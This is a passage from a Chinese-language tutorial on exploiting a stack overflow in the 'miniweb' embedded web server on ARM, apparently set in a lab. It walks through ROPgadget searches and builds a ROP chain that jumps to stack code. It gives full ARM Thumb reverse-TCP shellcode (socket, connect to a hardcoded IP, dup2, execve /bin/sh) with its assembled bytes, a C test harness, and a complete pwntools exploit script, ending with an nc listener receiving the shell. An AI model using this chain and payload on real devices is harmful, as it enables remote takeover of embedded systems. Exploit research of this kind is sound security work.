不想再去找带fork的miniweb的栈地址了，并且每次fork应该都会变，干脆干点稳定的，类似mov pc，sp之类的执行栈上的代码zhaoge

### <a class="reference-link" name="4.4%20ROP-%E5%B0%9D%E8%AF%95%E6%89%A7%E8%A1%8C%E6%A0%88%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE"></a>4.4 ROP-尝试执行栈上的数据

接下来寻找就是跳转到栈上执行代码的ROP

目标是：mov pc，sp，需要保证的：每一步需要能控制跳转

这里是从后往前找，从最终目标开始找起。

1.首先我想找mov pc，sp一类的，没有

2.然后找mov rX,sp;mov pc， rX 这种的，对于mov pc， rX ，只有 mov pc, r5; OK，这是最后一步不需要考虑之后的跳转，接下来需要保证的是将r5设置为sp

u:~/Desktop# ROPgadget —binary libc.so |grep “mov pc, r”<br>
0x0004d8cc : bne #0x4d8f8 ; mov lr, pc ; mov pc, r5 ; mov r7, #1 ; svc #0 ; mov lr, pc ; bx r5<br>
0x0004d8c0 : bx lr ; mov r0, r6 ; tst r5, #1 ; bne #0x4d904 ; mov lr, pc ; mov pc, r5 ; mov r7, #1 ; svc #0 ; mov lr, pc ; bx r5<br>
0x0004d8d0 : mov lr, pc ; mov pc, r5 ; mov r7, #1 ; svc #0 ; mov lr, pc ; bx r5<br>
0x0004d8d4 : mov pc, r5 ; mov r7, #1 ; svc #0 ; mov lr, pc ; bx r5<br>
0x0004d8c4 : mov r0, r6 ; tst r5, #1 ; bne #0x4d900 ; mov lr, pc ; mov pc, r5 ; mov r7, #1 ; svc #0 ; mov lr, pc ; bx r5<br>
0x0004d8c8 : tst r5, #1 ; bne #0x4d8fc ; mov lr, pc ; mov pc, r5 ; mov r7, #1 ; svc #0 ; mov lr, pc ; bx r5

3.然后就想找mov r5,sp,没有

4.接着找mov rX,sp;mov r5,rX，接下来每一都需要保证能控制跳转

对于mov rX,sp，只有mov r0,sp，其他的rX和sp都没有，ROPgadget —binary libc.so |grep “mov r0, sp” ，有个还不错的，其中r6可用pop`{`。。。r6`}`控制

0x000240f4 : beq #0x24190 ; mov r2, #0x18 ; mov r1, #0 ; mov r0, sp ; blx r6(r6可用pop`{`。。。r6`}`控制)

5.mov r5,rX就只能找mov r5,r0,有是有，只是都不太好用，看到很多还没到可控制的跳转（pop `{`pc`}`）就直接bl #address了,比如像这种 mov r5, r0 ; mov r0, r4 ; bl #0x4371c ; mov r0, r5 ; pop `{`r4, r5, r6, pc`}`

找来找去找到下面这条

root[@ubuntu](https://github.com/ubuntu):~/Desktop# ROPgadget —binary libc.so |grep “mov r5, r”<br>
0x0005244c : add r3, pc, r3 ; ldr r3, [r3] ; mov r5, r0 ; cmp r3, #0 ; mov r4, r1 ; beq #0x52490 ; blx r3

最后跳转是r3控制的，所以在执行这句之前必须设置好r3,需要注意的是r3并不能找到 pop `{`r3，。。。`}` 来控制;

6.接着找 ROPgadget —binary libc.so |grep “mov r3, r”，并可控pc的gadget

root[@ubuntu](https://github.com/ubuntu):~/Desktop# ROPgadget —binary libc.so |grep “mov r3, r”<br>
0x0002e288 : subs r2, r3, #0 ; bne #0x2e28c ; b #0x2e2ac ; mov r3, r2 ; add r0, r4, r3 ; pop `{`r4, pc`}`

7.r2同样没有pop`{`r2,…`}`可以设置，

接着找root[@ubuntu](https://github.com/ubuntu):~/Desktop# ROPgadget —binary libc.so |grep “mov r2, r”

有以下一些可用的（选择理由是r4 r7 r6都可用pop`{`rX。。。`}`控制）

0x000241e0 : mov r2, r4 ; mov r1, r5 ; mov r0, r6 ; blx r7<br>
0x00041d0c : mov r2, r7 ; mov r1, r5 ; ldr r0, [r4, #4] ; bl #0x41ce0 ; mov r2, r6 ; mov r1, #1 ; mov r0, r4 ; blx r5<br>
0x00041d1c : mov r2, r6 ; mov r1, #1 ; mov r0, r4 ; blx r5<br>
0x000450dc : mov r2, r6 ; mov r0, r4 ; blx r1

总算到头了。

所有的目的就是将sp传递到pc，中间用了很多rX来连接，每次连接都需要考虑下一步的跳转；所有数据来自栈，必须通过栈上的数据来控制跳转pop`{`rX….`}`也就是流程。

最后整个shellcode。

一开始跳转到gadget1：

pop `{`r4, r5, r6, r7, pc`}`// 控制r4, r5, r6, r7, pc

pc = 0x400241e0，目的是为了设置r2，其中上一步的r4控制r2，r4-&gt;r2-&gt;r3；r7控制接下来的流程

0x400241e0 : mov r2, r4 ; mov r1, r5 ; mov r0, r6 ; blx r7

r7 = 0x4002e288+0xc,目的是将r2传递到r3,r3之后会用来控制流程（r4-&gt;r2-&gt;r3）；使用栈的数据控制接下来的流程pop `{`r4, pc`}`

0x4002e288 : subs r2, r3, #0 ; bne #0x2e28c ; b #0x2e2ac ; mov r3, r2 ; add r0, r4, r3 ; pop `{`r4, pc`}`

​ mov r3, r2 ; add r0, r4, r3 ; pop `{`r4, pc`}`

pc=pc_2=0x400240f4+0x8 ，目的是将sp传递到r0, sp-&gt;r0-&gt;r5-&gt;pc，最开始的pop控制r6,控制流程

0x400240f4 : beq #0x24190 ; mov r2, #0x18 ; mov r1, #0 ; mov r0, sp ; blx r6

r6 = 0x4005244c+0x8 ,目的是将sp-&gt;r0-&gt;r5-&gt;pc，将r0传递到r5,r3之前已经设置好（r4-&gt;r2-&gt;r3），控制接下来的流程

0x0005244c : add r3, pc, r3 ; ldr r3, [r3] ; mov r5, r0 ; cmp r3, #0 ; mov r4, r1 ; beq #0x52490 ; blx r3

r3 = r2 =r4=0x4004d8d4,sp-&gt;r0-&gt;r5-&gt;pc,大功告成

0x0004d8d4 : mov pc, r5 ; mov r7, #1 ; svc #0 ; mov lr, pc ; bx r5

找的时候可能会有些稍微不清晰，但是心里会有个大致的感觉—就是这个最后能成还是不能成。

```
gadget1=0x40012468

pc = 0x400241e0

r6 = 0x4005244c+0x8

r5 = "AAAA"

r4 = 0x4004d8d4

r7 = 0x4002e288+0xc #0x4002E294

r4_2= "AAAA"

pc_2 = 0x400240f4+0x8

test= "x01x30x8fxe2x13xffx2fxe1x40x40x02x30x01x21x52x40x64x27xb5x37x01xdfx06x1cx0bxa1x4ax70x10x22x02x37x01xdfx30x1cx49x40x3fx27x01xdfx30x1cx01x31x01xdfx30x1cx01x31x01xdfx06xa0x52x40x05xb4x69x46xc2x71x0bx27x01xdfxffxffxffxffx02xaax11x5cxc0xa8x4ax89x2fx62x69x6ex2fx73x68x58"



payload1 =  "GET "+'A'*169 + p32(gadget1) +'AAAA'*4 +p32(r4)+ r5+p32(r6)+p32(r7)+p32(pc) +r4_2+p32(pc_2)+test+" HTTP/1.1rn"+"Host: 1.1.1.1rnrn"

p.send(payload1)
```

### <a class="reference-link" name="4.5%20shellcode%E7%BC%96%E5%86%99%E2%80%94%E6%8F%90%E4%BE%9B%E5%8F%8D%E5%90%91shell"></a>4.5 shellcode编写—提供反向shell

shellcode是我基于exploitdb上的shellcode修改的

在这个实验环境中execve(“/bin/sh”,0,0)会报错

必须是execve(“/bin/sh”,[“/bin/sh”],0)

```
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"
void main()
`{`
    char *arg[] = `{`"/bin/sh"`}`;
    execve("/bin/sh",arg,0);
`}`
```

shellcode.s

1.需要注意的地方就是避免0x20 0x00，我是通过变化指令来实现的，也有在shellcode开头添加一段解码汇编的。

修改指令推荐使用keystone中的kstool.exe(下载keystone windows版里面有)

2.设置execve第二个参数是这样设置的

push `{`r0, r2`}`; movs r1, sp;

3.padpad当前版本没有实际作用，之前版本留下的，这里作为一个提示。

之前版本的错误

ipv4.s: Assembler messages:<br>
ipv4.s:23: Error: invalid immediate for address calculation (value = 0x0000002A)<br>
ipv4.s:45: Error: invalid immediate for address calculation (value = 0x00000016

因为交叉编译工具不够智能，adr不能自动处理，导致后面的address不符合立即数的规范，是为了补成4的倍数。

比如padpad:<br>
.ascii “xffxff” ，当然现在是.ascii “xffxffxffxff” 没有实际作用

```
.section .text
.global _start
_start:
/* Enter Thumb mode */
    .ARM
    add    r3, pc, #1
    bx    r3

    .THUMB
/* Create a new socket*/
    eor         r0, r0, r0
#no 0x00
    add         r0, #2           
    movs        r1, #1           
    eor        r2, r2, r2       
    movs        r7, #100         
    add        r7, #181         
    svc         #1      
#use r6         
    mov         r6, r0             

/* Connect to client */
    adr     r1, struct_addr
    strb    r2, [r1, #1]     
    movs     r2, #16         
    add     r7, #2          
    svc     #1               

/* Duplicate STDIN, STDOUT and STERR */
#no 0x20
    movs     r0, r6         
    eor     r1, r1, r1     
    movs    r7, #63         
    svc     #1              
#no 0x20
    movs     r0, r6           
    add     r1, #1         
    svc    #1       
#no 0x20        
    movs     r0, r6       
    add     r1, #1         
    svc    #1               

/* Execute shell */
    adr     r0, shellcode 
    eor        r2, r2, r2 
    push   `{`r0, r2`}`
    movs   r1, sp
    strb    r2, [r0, #7]  
    mov    r7, #11        
    svc     #1

padpad:
.ascii "xffxffxffxff"   
struct_addr:
.ascii "x02xaa"          
.ascii "x11x5c"          
.ascii "xc0xa8x4ax89"  
shellcode:
.ascii "/bin/shX"
```

4.编译测试

执行命令：armv5l-as -o ipv4.o ipv4.s &amp;&amp; armv5l-ld -N -o ipv4 ipv4.o&amp;&amp;armv5l-objcopy -O binary ipv4 ipv4.bin&amp;&amp;hexdump -v -e ‘““”x” 1/1 “%02x” “”‘ ipv4.bin 打印信息就是shellcode，然后放入下面的数组中，执行armv5l-gcc reversetcp.c -o reversetcp —static编译即可

```
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned char sc[] = "x01x30x8fxe2x13xffx2fxe1x40x40x02x30x01x21x52x40x64x27xb5x37x01xdfx06x1cx0bxa1x4ax70x10x22x02x37x01xdfx30x1cx49x40x3fx27x01xdfx30x1cx01x31x01xdfx30x1cx01x31x01xdfx06xa0x52x40x05xb4x69x46xc2x71x0bx27x01xdfxffxffxffxffx02xaax11x5cxc0xa8x4ax89x2fx62x69x6ex2fx73x68x58";
//armv5l-gcc reversetcp.c -o reversetcp --static
void main()
`{`
    printf("Shellcode Length: %dn", strlen(sc));

    int (*ret)() = (int(*)())sc;

    ret();
`}`
```



## 5.总结

webs测试时应由简入繁，测试间隔应该细化。

寻找ROP链需要关注：1,如何实现最终目标 2,处在当前这一步，下一步应该跳向哪里，该如何控制

shellcode编写应注意：如果调试发现奇怪的问题，应该写测试程序放到目标环境中运行，缩小问题的范围。

reverseshell完整调试

5.1 运行patch后的miniweb，并附加，（我把要执行的命令写在README.txt了，原谅我的随意。。)

图片21

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01091931b5c34c7392.png)

5.2

结合完整利用

from pwn import *

p = remote(‘192.168.74.134’,80)

gadget1=0x40012468<br>
pc = 0x400241e0<br>
r6 = 0x4005244c+0x8<br>
r5 = “AAAA”<br>
r4 = 0x4004d8d4<br>
r7 = 0x4002e288+0xc #0x4002E294<br>
r4_2= “AAAA”<br>
pc_2 = 0x400240f4+0x8<br>
test= “x01x30x8fxe2x13xffx2fxe1x40x40x02x30x01x21x52x40x64x27xb5x37x01xdfx06x1cx0bxa1x4ax70x10x22x02x37x01xdfx30x1cx49x40x3fx27x01xdfx30x1cx01x31x01xdfx30x1cx01x31x01xdfx06xa0x52x40x05xb4x69x46xc2x71x0bx27x01xdfxffxffxffxffx02xaax11x5cxc0xa8x4ax89x2fx62x69x6ex2fx73x68x58”

payload1 = “GET “+’A’*169 + p32(gadget1) +’AAAA’*4 +p32(r4)+ r5+p32(r6)+p32(r7)+p32(pc) +r4_2+p32(pc_2)+test+” HTTP/1.1rn”+”Host: 1.1.1.1rnrn”<br>
p.send(payload1)

在gadget1下断点 b *0x40012468

图片22

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ad9007ea55048afa.png)

5.3 接下来发包触发断点，调试ROP

图片23-32

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f398ab85d0872828.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01376593997ac8c75a.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ce5cd153963302ad.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01de0a463e7a62761d.png)

[![](https://p1.ssl.qhimg.com/t01ab3b8185602727b3.png)](https://p1.ssl.qhimg.com/t01ab3b8185602727b3.png)

[![](https://p1.ssl.qhimg.com/t0188fb281f84410381.png)](https://p1.ssl.qhimg.com/t0188fb281f84410381.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f721cb7a4b04aad8.png)

[![](https://p3.ssl.qhimg.com/t01ae59c62f52d52645.png)](https://p3.ssl.qhimg.com/t01ae59c62f52d52645.png)

[![](https://p3.ssl.qhimg.com/t01951e212daf5db1e7.png)](https://p3.ssl.qhimg.com/t01951e212daf5db1e7.png)

[![](https://p4.ssl.qhimg.com/t012e2c4ef918a2c1ca.png)](https://p4.ssl.qhimg.com/t012e2c4ef918a2c1ca.png)

5.4 执行shellcode

图片33

[![](https://p2.ssl.qhimg.com/t01f90530ec5dfdb50e.png)](https://p2.ssl.qhimg.com/t01f90530ec5dfdb50e.png)

5.5 调试结束。运行未patch的miniweb，ubuntu 执行nc -lvp 4444，ubuntu ip变了调整shellcode中的ip

重启

图片34

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011301f50455143cdb.png)

等待

图片35

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010dc6319d555824b1.png)

send，成功

图片36

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017c2f83acc6f57ea8.png)
